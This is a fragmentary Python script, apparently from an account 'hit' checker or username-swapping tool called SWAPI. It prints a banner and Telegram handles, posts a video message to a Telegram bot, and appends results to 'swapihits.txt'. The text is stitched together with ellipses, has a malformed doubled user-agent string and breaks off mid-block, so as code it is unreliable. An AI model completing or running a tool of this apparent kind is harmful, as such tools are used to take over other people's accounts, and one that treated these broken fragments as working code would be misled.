...
# Generate ASCII Banner (like EVS AIO MAIN)
banner = render('SWAPI', colors=['blue', 'cyan'], align='center')
print(banner)

# === INFO PANELS ===
console.print(Panel("[bold cyan]Telegram:[/bold cyan] @swapiolds", border_style="blue"), end=" ")
import os
import sys
import re
import json
...
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Mozilla/5.0 (Windows NT 10.0; Win64) '
...
os.system('clear')
try:
    requests.post(f"""https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=https://t.me/HFR7M/12/6&caption= - By : [مناف السوري](t.me/B25urx)""")
except Exception:
    pass
...
By: @swapiolds 💀
"""
    with open('swapihits.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
